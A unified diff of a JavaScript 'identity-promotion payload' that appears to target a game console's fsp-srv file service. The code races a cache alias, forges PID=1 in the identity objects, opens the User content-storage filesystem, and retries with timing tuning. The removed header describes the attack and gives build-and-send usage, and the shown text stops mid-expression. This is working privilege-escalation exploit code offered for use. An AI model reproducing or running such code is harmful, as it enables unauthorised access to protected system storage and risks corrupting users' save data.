@@ -1,42 +1,11 @@
-// ============================================================
 // CivSwitchFS — FS identity-promotion payload
-// ============================================================
-// Risk: HIGH — runs up to 10 complete acquisition campaigns in one payload.
-// Each campaign uses the cache-acquisition workflow, creates temporary
-// save:/hole files, writes up to 8 MiB of dirty data per wave, and commits
-// cleanup. Repeated save-FS churn can degrade save health.
 //
-// What it does:
-//   1. Acquires and qualifies the fsp-srv cache alias through the reserved-gap
-//      timing window.
-//   2. Discovers and verifies the current root, NCA, and save identity
-//      objects, then installs the retained two-bucket memory endpoint.
-//   3. Temporarily writes PID=1 to the verified identity fields and makes one
-//      elevated OpenContentStorageFileSystem(User=1) call (fsp-srv cmd 110).
-//   4. Lists `/` through the returned User filesystem, closes the handles, and
-//      restores the exact original objects in reverse order.
-//   5. Retires the retained endpoint and removes the temporary save:/hole
-//      tree, verifying handle closure and tracked allocations.
-//
-// Scope and safety:
-//   - Every campaign starts from fresh discovery; no prior-run address or PID
-//     is used as a lookup input.
-//   - Promotion is temporary. The elevated call runs only after all three PID
-//     fields read back as 1.
-//   - No BIS command is issued. The User=1 selector is a storage ID, not the
-//     forged process PID.
-//   - A failed restoration, endpoint retirement, or cleanup skips the retry
-//     path; restart the console before running the payload again.
-//   - Success requires the User content-storage root listing to return
-//     transport 0 and result 0. Qualified timing windows do not guarantee a
-//     canary flip.
-//
-// Usage: build with `npm run build`, then send with
-// `npm run send -- <console-ip>`.
-// ============================================================
+// Promotes fsp-srv identity to PID 1, opens User content storage, lists /,
+// retains the promoted session and candidate storage, and cleans up other handles.
+// See README.md and HOW_IT_WORKS.md for full details.
 
 import coreRuntime, {setLogPolicy, waitMs} from "./core/runtime.mjs";
-import {createFspIdentityConfig} from "./core/config.mjs";
+import {createFspIdentityConfig, VERBOSE_LOGGING} from "./core/config.mjs";
 import {
   borrowRawThreadScheduling,
   openFspSessions,
@@ -47,25 +16,51 @@ import {
   buildIpcRequests,
   checkPathPair,
   applyCmifContexts,
-  prepareWaveInfrastructure,
-  runControlWaveLoop,
+  prepareWaveInfrastructure
+} from "./core/steps/setup.mjs";
+import {
+    runControlWaveLoop,
+    WINDOW_RATE_THRESHOLD
+} from "./core/steps/campaign.mjs";
+import {
   preparePostCanaryCandidate,
-  installCacheAlias,
+  installCacheAlias
+} from "./core/steps/alias.mjs";
+import {
   prepareReleaseNeighbors,
   captureReleaseBaseline,
   releaseNeighborsAndFindPointers,
-  qualifyAddressPlan,
+  qualifyAddressPlan
+} from "./core/steps/discovery.mjs";
+import {
   retireCandidateCacheAndClose,
   cleanupScratchAndHandles
-} from "./core/steps.mjs";
-import {createFspIdentityHelpers} from "./core/helpers.mjs";
+} from "./core/steps/cleanup.mjs";
+import {createFspIdentityHelpers} from "./core/helpers/index.mjs";
 import {runPromotionStep} from "./core/promotion.mjs";
+import {
+    formatAddressResults,
+    formatAliasResult,
+    formatAliasTiming,
+    formatCanaryResult,
+    formatCleanupResult,
+    formatCode,
+    formatFailureSuffix,
+    formatPromotionResult,
+    formatRetirementResult
+} from "./core/log-format.mjs";
+import {
+    setVerboseLogging,
+    stageOnlyLog,
+    emitStage,
+    emitVerboseStage
+} from "./core/log-stage.mjs";
+import {clearVisualLog, installVisualLogPatch} from "./core/visuals.mjs";
 
 const {
     allocPage,
     beginAllocationTracking,
     checkWindow,
-    cloneFsSession,
     closeHandle,
     cmifReply,
     endAllocationTracking,
@@ -73,7 +68,6 @@ const {
     freeTrackedAllocations,
     ipcCommitChecked,
     ipcDeleteDirectoryRecursivelyChecked,
-    log,
     prepPacket,
     read32,
     sendIPC,
@@ -82,882 +76,221 @@ const {
     writeXDesc
 } = coreRuntime;
 
-const STAGE_LOG_MARKER = "\u0001stage:";
-const MAX_ATTEMPTS = 10;
+const BASE_ATTEMPTS = 10;
+const MAX_TOTAL_ATTEMPTS = 30;
 const RETRY_PAUSE_MS = 250;
 const SCRATCH_DIR = "/hole";
 const NOT_FOUND = 0x202;
-let currentAttemptNumber = 0;
 
-function stageOnlyLog(message) {
-    if (typeof message === "string" && message.startsWith(STAGE_LOG_MARKER))
-        return message.slice(STAGE_LOG_MARKER.length);
-    return null;
-}
+// ---------------------------------------------------------------------------
+// Entry point (bounded retry loop)
+// ---------------------------------------------------------------------------
 
-const LOG_PAUSE_MS = 30;
+export async function run() {
+    installVisualLogPatch();
+    const previousVerboseLogging = setVerboseLogging(VERBOSE_LOGGING);
+    const previousLogPolicy = setLogPolicy(stageOnlyLog);
 
-function attemptLogPrefix() {
-    const attempt = currentAttemptNumber
-        ? "A" + String(currentAttemptNumber).padStart(2, "0") + "/" +
-            MAX_ATTEMPTS + " "
-        : "035 ";
-    return attempt;
-}
-
-async function emitFastStage(message) {
-    await log(STAGE_LOG_MARKER + attemptLogPrefix() + message);
-}
-
-async function emitStage(message) {
-    await emitFastStage(message);
-    await waitMs(LOG_PAUSE_MS);
-}
-
-// Give progress lines a short flush window so the sender surfaces them while
-// the longer address, metadata, and root phases are still running.
-async function emitProgress(message) {
-    await emitFastStage(message);
-    await waitMs(LOG_PAUSE_MS);
-}
-
-// Canary progress is emitted after wave timing analysis. Avoid a fixed pause
-// before the next positive attempt.
-async function emitCanaryProgress(message) {
-    await emitFastStage(message);
-}
-
-function readEntryTypeChecked(handle, path) {
-    const pathBuf = allocPage(0x1000);
-    const packet = allocPage(0x2000);
-    writeStr(pathBuf, path);
-    prepPacket(packet, (4 | (1 << 16)) >>> 0, 8, []);
-    writeXDesc(packet, 8, pathBuf, path.length + 1);
-    write32(packet + 0x10n, 0x49434653n);
-    write32(packet + 0x18n, 7n);
-    const transport = Number(sendIPC(handle, packet)) >>> 0;
-    if (transport !== 0)
-        return {transport, result: null, type: null};
-    const reply = cmifReply(packet);
-    return {transport, result: reply.result,
-        type: reply.result === 0
-            ? Number(read32(packet + BigInt(reply.data))) >>> 0 : null};
-}
-
-async function runHoleCleanupHandler(attemptState) {
-    const handle = attemptState.holeCleanupHandle;
-    if (!handle) {
-        attemptState.holeCleanupVerified = false;
-        await emitFastStage("HOLE FALLBACK: no independent save handle; " +
-            "absence cannot be verified.");
-        return false;
-    }
-
-    let initial = null;
-    let deletion = null;
-    let commit = null;
-    let verification = null;
-    let reason = null;
-    let shouldVerify = false;
-    let closeResult = null;
-    let absenceVerifiedByPrimary = false;
     try {
-        await emitFastStage("HOLE FALLBACK: checking /hole on the reserved " +
-            "temporary save handle.");
-        if (attemptState.primaryScratchCleanupVerified) {
-            absenceVerifiedByPrimary = true;
-        } else {
-            initial = readEntryTypeChecked(handle, SCRATCH_DIR);
-            if (initial.transport !== 0) {
-                reason = "initial-check-transport=" +
-                    formatCode(initial.transport);
-            } else if (initial.result === NOT_FOUND) {
-                if (attemptState.primaryCleanupAttempted &&
-                    !attemptState.primaryCommitVerified) {
-                    commit = ipcCommitChecked(handle);
-                    if (commit.transport !== 0 || commit.result !== 0) {
-                        reason = "recommit-failed";
-                    } else {
-                        verification = readEntryTypeChecked(handle, SCRATCH_DIR);
-                        if (verification.transport !== 0 ||
-                            verification.result !== NOT_FOUND)
-                            reason = "absence-verification-failed-after-recommit";
-                    }
-                } else {
-                    // This lookup already proves the path is absent. Do not
-                    // issue a second GetEntryType for the same state.
-                    verification = initial;
+        let canaryTimingSchedule = null;
+        let attemptLimit = BASE_ATTEMPTS;
+        let positiveAttemptsTotal = 0;
+        let positiveWindowsTotal = 0;
+
+        for (let attempt = 1; attempt <= attemptLimit; attempt++) {
+            await emitStage("======== ATTEMPT " + attempt + " ========");
+            // The hard-cap attempt verifies the last schedule without retuning.
+            const result = await runTrackedAttempt(canaryTimingSchedule,
+                attempt < MAX_TOTAL_ATTEMPTS);
+            positiveAttemptsTotal += result.positiveAttempts || 0;
+            positiveWindowsTotal += result.positiveWindows || 0;
+
+            if (result.permissionProven) {
+                if (result.promotionRestored && result.safeToRetry) {
+                    await emitStage("Attempt complete.");
                 }
-                shouldVerify = !reason && Boolean(verification);
-            } else if (initial.result === 0 && initial.type === 0) {
-                deletion = ipcDeleteDirectoryRecursivelyChecked(handle, SCRATCH_DIR);
-                if (deletion.transport !== 0 || deletion.result !== 0) {
-                    reason = "delete-failed";
-                } else {
-                    commit = ipcCommitChecked(handle);
-                    if (commit.transport !== 0 || commit.result !== 0)
-                        reason = "commit-failed";
-                    else shouldVerify = true;
-                }
-            } else if (initial.result === 0) {
-                reason = "path-exists-but-is-not-a-directory";
-            } else {
-                reason = "initial-check-result=" + formatCode(initial.result);
+                return;
             }
 
-            if (shouldVerify && !verification) {
-                verification = readEntryTypeChecked(handle, SCRATCH_DIR);
-                if (verification.transport !== 0 ||
-                    verification.result !== NOT_FOUND)
-                    reason = "absence-verification-failed";
+            if (!result.safeToRetry) {
+                return;
             }
+
+            canaryTimingSchedule = copyCanaryTimingSchedule(
+                result.canaryTimingSchedule) || canaryTimingSchedule;
+
+            if (result.timingAdjustments?.length) {
+                const timingSource = result.timingAdjustments.some(
+                    adjustment => adjustment.source === "control")
+                    ? " from control waves" : "";
+                if (attemptLimit < MAX_TOTAL_ATTEMPTS) {
+                    attemptLimit++;
+                    await emitStage("Timing changed" + timingSource +
+                        "; extending the campaign to " +
+                        attemptLimit + " attempts so the adjusted schedule can be tested.");
+                } else if (attempt < MAX_TOTAL_ATTEMPTS) {
+                    await emitStage("Timing changed" + timingSource + "; attempt " +
+                        MAX_TOTAL_ATTEMPTS +
+                        " is reserved to validate the adjusted schedule.");
+                }
+            }
+
+            if (attempt === attemptLimit) {
+                const rate = positiveAttemptsTotal > 0
+                    ? positiveWindowsTotal / positiveAttemptsTotal : null;
+                const windowSummary = positiveAttemptsTotal > 0
+                    ? "Qualified windows: " + positiveWindowsTotal + "/" +
+                      positiveAttemptsTotal + " (" +
+                      (rate * 100).toFixed(0) + "%)."
+                    : "No positive waves ran.";
+                const restartHint = rate !== null &&
+                    rate >= WINDOW_RATE_THRESHOLD
+                    ? " Restart the game before another run."
+                    : "";
+                await emitStage("Stopped after " + attempt +
+                    " attempts; user storage access was not verified. " +
+                    windowSummary + restartHint);
+                return;
+            }
+
+            await waitMs(RETRY_PAUSE_MS);
         }
     } catch (error) {
-        reason = "handler-threw:" + String(error?.message || error);
+        await emitStage("Unexpected error. Checking cleanup status.");
+        await emitVerboseStage("Workflow error: " + String(error?.message || error));
     } finally {
-        try {
-            closeResult = Number(closeHandle(handle)) >>> 0;
-        } catch (error) {
-            reason = reason || "handle-close-threw:" +
-                String(error?.message || error);
-        }
-        attemptState.holeCleanupHandle = 0;
+        setLogPolicy(previousLogPolicy);
+        setVerboseLogging(previousVerboseLogging);
+    }
+}
+
+function copyCanaryTimingSchedule(schedule) {
+    if (!schedule || !Array.isArray(schedule.roleDelays) ||
+        !Array.isArray(schedule.guardDelays) ||
+        !Array.isArray(schedule.baselineRoleDelays) ||
+        !Array.isArray(schedule.baselineGuardDelays)) return null;
+    return {
+        roleDelays: schedule.roleDelays.slice(),
+        guardDelays: schedule.guardDelays.slice(),
+        baselineRoleDelays: schedule.baselineRoleDelays.slice(),
+        baselineGuardDelays: schedule.baselineGuardDelays.slice()
+    };
+}
+
+function formatFinalTimingSchedule(schedule) {
+    if (!schedule || !Array.isArray(schedule.roleDelays) ||
+        schedule.roleDelays.length !== 10 ||
+        !schedule.roleDelays.every(Number.isSafeInteger) ||
+        !Array.isArray(schedule.guardDelays) ||
+        schedule.guardDelays.length !== 2 ||
+        !schedule.guardDelays.every(Number.isSafeInteger)) {
+        return ["Final timing values are unavailable."];
     }
 
-    attemptState.holeCleanupVerified = Boolean(!reason &&
-        (absenceVerifiedByPrimary || (shouldVerify &&
-            verification?.transport === 0 &&
-            verification?.result === NOT_FOUND)) && closeResult === 0);
-    if (!attemptState.cleanupVerified && attemptState.holeCleanupVerified &&
-        attemptState.primaryCleanupAttempted &&
-        attemptState.primaryHandlesClosed &&
-        attemptState.endpointRetirementVerified &&
-        attemptState.workerStateSafe) {
-        attemptState.cleanupVerified = true;
-        attemptState.cleanupSummary = "fallback /hole cleanup verified; " +
-            "endpoint retired and all primary handles closed";
-    }
-    const initialText = absenceVerifiedByPrimary ? "primary-cleanup-verified"
-        : initial?.transport !== 0
-        ? "transport=" + formatCode(initial?.transport)
-        : initial?.result === NOT_FOUND ? "already-absent"
-        : initial?.result === 0 ? "present-type=" + initial.type
-        : "result=" + formatCode(initial?.result);
-    const commitText = commit
-        ? formatCode(commit.transport) + "/" + formatCode(commit.result)
-        : attemptState.primaryCommitVerified ? "primary-verified" : "not-needed";
-    await emitFastStage("HOLE FALLBACK: initial=" + initialText +
-        "; delete=" + (deletion
-            ? formatCode(deletion.transport) + "/" + formatCode(deletion.result)
-            : "not-needed") +
-        "; commit=" + commitText +
-        "; fallbackIpc=" + (absenceVerifiedByPrimary ? "skipped" : "used") +
-        "; absent=" + (attemptState.holeCleanupVerified ? "verified" : "no") +
-        "; handleClose=" + formatCode(closeResult) +
-        (reason ? "; reason=" + reason : "") + ".");
-    return attemptState.holeCleanupVerified;
-}
-
-function formatCode(value) {
-    if (value === null || value === undefined) return "n/a";
-    return "0x" + (Number(value) >>> 0).toString(16).padStart(8, "0");
-}
-
-function seconds(valueMs) {
-    return (valueMs / 1000).toFixed(1) + "s";
-}
-
-function formatAddressResults(address, elapsedMs) {
-    const profile = address.timingProfile || {};
-    const addressReads = profile.addressReads || 0;
-    const metadata = profile.metadata || 0;
-    const pages = profile.pages || 0;
-    const root = profile.root || 0;
-    const period = profile.period || 0;
-    const rootClear = profile.rootClear || 0;
-    const rootRead = profile.rootRead || 0;
-    const rootScan = profile.rootScan || 0;
-    const rootLookup = profile.rootLookup || 0;
-    const rootChunksRead = profile.rootChunksRead || 0;
-    const attributed = addressReads + metadata + pages + root + period;
-    const other = Math.max(0, elapsedMs - attributed);
-    const addressStatus = address.addressReadVerified ? "passed" : "rejected";
-    const aliasStatus = address.addressAliasRequalified === null
-        ? "not run" : address.addressAliasRequalified ? "passed" : "failed";
-    const periodStatus = address.bucketPeriodQualified === null
-        ? "not run" : address.bucketPeriodQualified ? "passed" : "failed";
-    const rootStatus = address.rootStageVerified ? "verified" :
-        (address.addressReadVerified ? "not verified" : "not checked");
-    const addressFailure = address.addressFailureReason
-        ? "; reason=" + address.addressFailureReason.replace(/-/g, " ") : "";
-    const failureDetail = address.addressFailureDetail
-        ? "; detail=" + address.addressFailureDetail : "";
-    const sizeError = address.storageSizeError !== null
-        ? "; storageSizeError=" + formatCode(address.storageSizeError) : "";
     return [
-        "Address qualification: read " + addressStatus +
-            "; candidates=" + address.addressCandidatesTested +
-            "; changed-link seeds=" + address.changedLinkCandidates +
-            "; valid plans=" + address.validAddressPlans +
-            "; alias recheck=" + aliasStatus +
-            "; period=" + periodStatus +
-            "; plan-read=" + seconds(addressReads) +
-            "; period-time=" + seconds(period) +
-            "; total=" + seconds(addressReads + period) +
-            addressFailure + failureDetail + sizeError,
-        "Metadata: link checks=" + address.metadataAnchorChecks +
-            "; valid pages=" + address.metadataPageChecks +
-            "; probes=" + address.metadataPageProbes +
-            "; discovery=" + seconds(metadata) +
-            "; page=" + seconds(pages) +
-            "; total=" + seconds(metadata + pages),
-        "FSP root: " + rootStatus +
-            "; scans=" + address.rootCandidateScans +
-            "; PID " + (address.rootPidRead ? "read" : "not read") +
-            "; more candidates may qualify=" +
-                Boolean(address.rootCandidateRetryable) +
-            "; time=" + seconds(root) +
-            "; chunks=" + rootChunksRead +
-            "; clear/read/scan/lookup=" + seconds(rootClear) + "/" +
-                seconds(rootRead) + "/" + seconds(rootScan) + "/" +
-                seconds(rootLookup) +
-            "; plans/other=" + seconds(other) +
-            "; total=" + seconds(elapsedMs)
+        "Successful timings in nanoseconds; copy into src/core/config.mjs:",
+        "var roleDelays = [" + schedule.roleDelays.join(", ") + "];",
+        "var guardDelays = [" + schedule.guardDelays.join(", ") + "];"
     ];
 }
 
-function formatAliasTiming(alias, elapsedMs) {
-    const waves = Number(alias?.copyWavesTotal) || 0;
-    const perWave = waves ? seconds(elapsedMs / waves) + "/wave" : "n/a per wave";
-    return " (elapsed " + seconds(elapsedMs) + "; " + perWave + ")";
+async function beginCleanupLog(attemptState) {
+    if (attemptState.cleanupLogStarted) return;
+    attemptState.cleanupLogStarted = true;
+    await emitStage("Cleaning up...");
 }
 
-function formatFailureSuffix(result) {
-    if (!result?.failureReason) return "";
-    return " (reason=" + result.failureReason +
-        (result.failureDetail ? "; detail=" + result.failureDetail : "") + ")";
+function reportAddressProgress(message) {
+    if (VERBOSE_LOGGING) return emitVerboseStage(message);
+    if (typeof message !== "string") return Promise.resolve();
+
+    const concisePrefix = "ADDRESS_SCAN:";
+    if (message.startsWith(concisePrefix))
+        return emitStage(message.slice(concisePrefix.length).trim());
+    if (message.startsWith("FSP root capture and scan in progress:"))
+        return emitStage("FSP root identity scan is halfway complete.");
+    return Promise.resolve();
 }
 
-function median(values) {
-    const sorted = values.filter(value => Number.isFinite(value))
-        .slice().sort((a, b) => a - b);
-    if (!sorted.length) return null;
-    const middle = Math.floor(sorted.length / 2);
-    return sorted.length % 2 ? sorted[middle]
-        : (sorted[middle - 1] + sorted[middle]) / 2;
-}
 
-function displayUs(value) {
-    return "~" + Math.round(value) + "µs";
-}
+// ---------------------------------------------------------------------------
+// Tracked attempt (one full attempt with allocation tracking)
+// ---------------------------------------------------------------------------
 
-function humanRoleName(role) {
-    const names = {
-        commit: "Commit worker",
-        bottleneck: "Bottleneck read worker",
-        frag0: "Fragment worker 0",
-        frag1: "Fragment worker 1",
-        frag2: "Fragment worker 2",
-        frag3: "Fragment worker 3",
-        canary: "Canary lookup worker",
-        filler0: "Filler worker 0",
-        filler1: "Filler worker 1",
-        guard0: "Guard worker 0",
-        guard1: "Guard worker 1",
-        trigger: "Trigger worker"
-    };
-    return names[role] || role;
-}
-
-function collectTimingIssues(control, config) {
-    const records = control.positiveWindowRecords || [];
-    const rejected = records.filter(record => !record.window);
-    const issues = Object.create(null);
-    let triggerSpanMissing = 0;
-
-    const addIssue = (role, kind, delta, wave) => {
-        const key = role + ":" + kind;
-        const issue = issues[key] || (issues[key] = {
-            role, kind, count: 0, values: [], lastWave: null
-        });
-        if (issue.lastWave !== wave) {
-            issue.count++;
-            issue.lastWave = wave;
-        }
-        if (Number.isFinite(delta)) issue.values.push(delta);
-    };
-
-    for (const record of rejected) {
-        const timings = record.roleTimings || {};
-        const trigger = timings.trigger;
-        if (!trigger) {
-            triggerSpanMissing++;
-            continue;
-        }
-        for (const role of record.shapeMissing || []) {
-            const timing = timings[role];
-            if (!timing) {
-                addIssue(role, "unmeasured", null, record.wave);
-                continue;
-            }
-            if (timing.relStartUs >= 0)
-                addIssue(role, "late-start", timing.relStartUs, record.wave);
-            if (config.throughRoles.indexOf(role) >= 0 &&
-                timing.relEndUs <= trigger.relEndUs) {
-                addIssue(role, "early-end-through",
-                    trigger.relEndUs - timing.relEndUs, record.wave);
-            } else if (config.heldRoles.indexOf(role) >= 0 &&
-                timing.relEndUs <= 0) {
-                addIssue(role, "early-end-held", -timing.relEndUs, record.wave);
-            }
-        }
-    }
-
-    const ordered = Object.keys(issues).map(key => issues[key])
-        .sort((a, b) => b.count - a.count ||
-            (median(b.values) || 0) - (median(a.values) || 0));
-    const messages = ordered.slice(0, 6).map(issue => {
-        const count = issue.count + "/" + rejected.length + " rejected waves";
-        if (issue.kind === "unmeasured")
-            return humanRoleName(issue.role) + " timing unavailable (" + count + ")";
-        const amount = median(issue.values);
-        if (issue.kind === "late-start") {
-            return amount === 0
-                ? humanRoleName(issue.role) + " started at trigger start; it must start earlier (" + count + ")"
-                : humanRoleName(issue.role) + " started " + displayUs(amount) +
-                    " after trigger start (" + count + ")";
-        }
-        const boundary = issue.kind === "early-end-through"
-            ? "trigger end" : "trigger start";
-        return amount === 0
-            ? humanRoleName(issue.role) + " ended at " + boundary +
-                "; it must run longer (" + count + ")"
-            : humanRoleName(issue.role) + " ended " + displayUs(amount) +
-                " before " + boundary + " (" + count + ")";
-    });
-
-    if (triggerSpanMissing)
-        messages.unshift("Trigger timing unavailable (" + triggerSpanMissing +
-            "/" + rejected.length + " rejected waves)");
-    if (ordered.length > 6)
-        messages.push((ordered.length - 6) + " more worker timing issues");
-    return {rejected, messages};
-}
-
-function summarizePinQualification(control) {
-    if (control.pinFirstWaveQualified) return "";
-    const pin = control.pinQualificationDiagnostics;
-    if (!pin) {
-        const attempted = (control.profileCounts || {})["abort-control"] || 0;
-        return attempted
-            ? "Initial cache pin qualification failed; timing details unavailable."
-            : "";
-    }
-
-    const issues = [];
-    if (!pin.shapeOk) issues.push("pin IPC reply shape failed");
-    if (!pin.costOk) issues.push("pin allocation size did not match expected");
-    if (!pin.restored) issues.push("heap counters did not restore");
-    if (!pin.windowMeasured) {
-        issues.push("canary/pin timing spans were not measured");
-    } else {
-        if (pin.startOffsetUs <= 0) {
-            const amount = Math.abs(pin.startOffsetUs);
-            issues.push(amount === 0
-                ? "Cache pin worker started with Canary; it must start after it"
-                : "Cache pin worker started " + displayUs(amount) +
-                    " too early relative to Canary");
-        }
-        if (pin.endMarginUs <= 0) {
-            const amount = Math.abs(pin.endMarginUs);
-            issues.push(amount === 0
-                ? "Cache pin worker ended with Canary; it must finish first"
-                : "Cache pin worker ended " + displayUs(amount) +
-                    " too late relative to Canary");
-        }
-        if (!pin.windowOk && pin.startOffsetUs > 0 && pin.endMarginUs > 0)
-            issues.push("Cache pin timing did not fit inside the Canary span");
-    }
-    return issues.length ? "Initial pin: " + issues.join("; ") + "." :
-        "Initial cache pin qualification failed.";
-}
-
-function humanStopReason(control) {
-    const reason = control.workflowStopReason;
-    if (!reason) return control.controlsQualified
-        ? "positive attempt limit reached" : "control sequence incomplete";
-    let match = /^dirty-write-failed-at-wave-(\d+)$/.exec(reason);
-    if (match) return "dirty-file write failed at wave " + match[1];
-    match = /^reservation-failed-at-wave-(\d+)$/.exec(reason);
-    if (match) return "reservation setup failed at wave " + match[1];
-    match = /^worker-start-failed-at-wave-(\d+)$/.exec(reason);
-    if (match) return "workers failed to start at wave " + match[1];
-    match = /^worker-join-failed-at-wave-(\d+)$/.exec(reason);
-    if (match) return "workers failed to join at wave " + match[1];
-    match = /^profile-setup-failed-(.+)$/.exec(reason);
-    if (match) return "could not configure the " + match[1] + " profile";
-    return reason.replace(/-/g, " ");
-}
-
-function summarizeRejectedGates(control, timing) {
-    const counts = control.positiveGateFailures || {};
-    const total = (control.positiveWindowRecords || []).length;
-    const human = {
-        reservation: "reservation group incomplete",
-        "workers-done": "not all workers completed",
-        transport: "an IPC send failed",
-        "workers-join": "not all workers joined",
-        "protected-10": "protected worker completion flags missing",
-        "release-sent": "release message was not sent",
-        signal: "wave completion signal failed",
-        tails: "fragment responses were unexpected",
-        commit: "Commit worker failed",
-        read: "Bottleneck read worker failed",
-        "pin-shape": "cache pin reply shape failed",
-        "clear-ok": "clear command failed",
-        "pre-ok": "pre-release query failed",
-        "heap-restore": "heap allocation counters did not restore",
-        "pin-cost": "cache pin allocation size mismatch"
-    };
-    const entries = [];
-    for (const [key, count] of Object.entries(counts)) {
-        if (key === "shape-10" || key === "margin>=300" ||
-            key === "pre-release" || key === "trig-span" ||
-            key === "pin-window" || key === "pin-1st") continue;
-        if (key === "no-abort") {
-            const samples = (timing.rejected || []).map(record => record.guardSamples)
-                .filter(Boolean);
-            const guardKinds = [];
-            if (samples.some(sample => sample.completed)) guardKinds.push("completion");
-            if (samples.some(sample => sample.earlyHole)) guardKinds.push("early-hole");
-            if (samples.some(sample => sample.spacing)) guardKinds.push("spacing");
-            entries.push("worker abort guard fired" +
-                (guardKinds.length ? " (" + guardKinds.join(", ") + ")" : "") +
-                " (" + count + "/" + total + ")");
-        } else if (key === "paths") {
-            const changed = new Set();
-            for (const record of timing.rejected || []) {
-                if ((record.rejections || []).indexOf("paths") < 0) continue;
-                for (const path of record.changedPaths || []) changed.add(path);
-            }
-            const names = Array.from(changed).map(humanRoleName);
-            entries.push(names.length
-                ? "unexpected result from " + names.join(", ") +
-                    " (" + count + "/" + total + ")"
-                : "canary/filler/guard result did not match expected status (" +
-                    count + "/" + total + ")");
-        } else {
-            entries.push((human[key] || key.replace(/-/g, " ")) +
-                " (" + count + "/" + total + ")");
-        }
-    }
-
-    if (counts["shape-10"] && !timing.messages.length)
-        entries.push("required worker overlap pattern did not qualify");
-    if (counts["trig-span"] && !timing.messages.some(message =>
-            message.startsWith("Trigger timing")))
-        entries.push("Trigger worker span was not measured");
-    if (counts["margin>=300"]) {
-        const marginRecords = (timing.rejected || []).filter(record =>
-            (record.rejections || []).indexOf("margin>=300") >= 0);
-        const margins = marginRecords.map(record => record.marginUs);
-        const shortages = marginRecords.map(record => record.marginSlackUs)
-            .filter(Number.isFinite).map(value => Math.max(0, -value));
-        const typicalMargin = median(margins);
-        const typicalShortage = median(shortages);
-        if (typicalMargin === null) {
-            entries.push("Bottleneck/Guard 1 overlap margin was not measured");
-        } else {
-            entries.push("Bottleneck/Guard 1 overlap was " +
-                displayUs(typicalMargin) + " (needs 300µs" +
-                (typicalShortage === null ? ")" : "; short by " +
-                    displayUs(typicalShortage) + ")") +
-                " (" + counts["margin>=300"] + "/" + total + ")" +
-                "; extend Bottleneck or start Guard 1 earlier");
-        }
-    }
-    if (counts["pre-release"]) {
-        const shortages = (timing.rejected || []).filter(record =>
-            (record.rejections || []).indexOf("pre-release") >= 0)
-            .map(record => record.preReleaseSlackBytes)
-            .filter(Number.isFinite).map(value => Math.max(0, -value));
-        const typicalShortage = median(shortages);
-        entries.push(typicalShortage === null
-            ? "pre-release cache hold was not measured"
-            : "pre-release cache hold was ~" +
-                Math.round(typicalShortage) + "B below the 0x2600-byte minimum" +
-                " (" + counts["pre-release"] + "/" + total + ")");
-    }
-    const pinIssue = summarizePinQualification(control);
-    if (pinIssue) entries.push(pinIssue);
-
-    return entries;
-}
-
-function formatCanaryResult(control, config) {
-    if (!control) return "Canary run failed before returning a result.";
-    if (control.canaryQualified) {
-        return "Canary flipped! (positiveAttempts=" +
-            control.positiveAttempts + ", qualifiedWindows=" +
-            control.positiveWindows + ")";
-    }
-
-    const stateLabels = {
-        "controls-incomplete": "control sequence incomplete",
-        "no-qualified-positive-window": "no qualified positive window",
-        "window-valid-no-flip": "qualified window, no flip",
-        "raw-flip-outside-window": "flip outside qualified window",
-        "post-health-failure": "post-flip health check failed",
-        "worker-unsafe": "worker state unsafe"
-    };
-    const controls = [
-        "pin=" + Boolean(control.pinFirstWaveQualified),
-        "abort=" + Boolean(control.abortControlPassed),
-        "hole=" + Boolean(control.abortHoleControlPassed),
-        "extent=" + Boolean(control.extentQualified),
-        "negative=" + Boolean(control.negativeControlPassed)
-    ].join(",");
-    const counts = control.profileCounts || {};
-    const attemptsByProfile = "abort=" + (counts["abort-control"] || 0) +
-        ",hole=" + (counts["abort-hole-control"] || 0) +
-        ",extentAbsent=" + (counts["extent-absent"] || 0) +
-        ",extentPresent=" + (counts["extent-present"] || 0) +
-        ",negative=" + (counts.negative || 0) +
-        ",positive=" + (counts.positive || 0);
-    const records = control.positiveWindowRecords || [];
-    const timing = collectTimingIssues(control, config);
-    const otherIssues = summarizeRejectedGates(control, timing);
-
-    const label = stateLabels[control.campaignState] || control.campaignState;
-    const outcome = control.campaignState === "controls-incomplete"
-        ? "Canary not qualified"
-        : control.campaignState === "worker-unsafe"
-        ? "Canary run aborted"
-        : control.campaignState === "post-health-failure"
-        ? "Canary flip rejected"
-        : control.campaignState === "raw-flip-outside-window"
-        ? "Canary flip outside qualified window"
-        : "Canary didn't flip";
-    return outcome + " (" + label + ")" +
-        "; controls=" + (control.controlsQualified ? "passed" : "incomplete") +
-        "{" + controls + "}" +
-        "; attemptsByProfile={" + attemptsByProfile + "}" +
-        "; positiveAttempts=" + control.positiveAttempts +
-        "; nextProfile=" + (control.nextProfile || "done") +
-        "; waveCap=" + config.MAX_CONTROL_WAVES +
-        "; stopReason=" + humanStopReason(control) +
-        "; worker state " + (control.workerStateSafe ? "safe" : "unsafe") +
-        "; qualifiedWindows=" + control.positiveWindows + "/" + records.length +
-        "; observedFlips=" + control.positiveObservedRedirects +
-        "; outsideWindowFlips=" + control.positiveOutsideWindowFlips +
-        "; qualifiedFlips=" + control.positiveQualifiedFlips +
-        "; postHealthFailures=" + control.positiveHealthFailures +
-        (timing.messages.length
-            ? "; timing findings={" + timing.messages.join("; ") + "}" : "") +
-        (otherIssues.length
-            ? "; other issues={" + otherIssues.join("; ") + "}" : "");
-}
-
-function formatCanaryType(type) {
-    if (type === 0) return "DIR";
-    if (type === 1) return "FILE";
-    if (type === null || type === undefined) return "NA";
-    return "ERR" + Number(type);
-}
-
-async function emitPositiveWindowDiagnostics(control, config) {
-    const records = control?.positiveWindowRecords || [];
-    for (const record of records) {
-        const timingParts = [];
-        const timings = record.roleTimings || {};
-        for (let index = 0; index < config.roleLabels.length; index++) {
-            const role = config.roleLabels[index];
-            const timing = timings[role];
-            if (!timing) continue;
-            timingParts.push(config.roleShort[index] + "=" +
-                timing.relStartUs.toFixed(0) + ".." +
-                timing.relEndUs.toFixed(0));
-        }
-        const health = record.postCanaryHealth || {};
-        const preRelease = Number.isFinite(record.preReleaseUsed)
-            ? "0x" + Math.trunc(record.preReleaseUsed).toString(16) : "NA";
-        const margin = Number.isFinite(record.marginUs)
-            ? record.marginUs.toFixed(0) + "us" : "NA";
-        const trigger = record.triggerResult == null
-            ? "NA" : formatCode(record.triggerResult);
-        await emitFastStage("CANARY-W" +
-            String(record.wave).padStart(2, "0") +
-            " window=" + Boolean(record.window) +
-            " canary=" + (record.canaryResult == null
-                ? "NA" : formatCode(record.canaryResult)) +
-            "/" + formatCanaryType(record.canaryType) +
-            " redirect=" + Boolean(record.observedRedirect) +
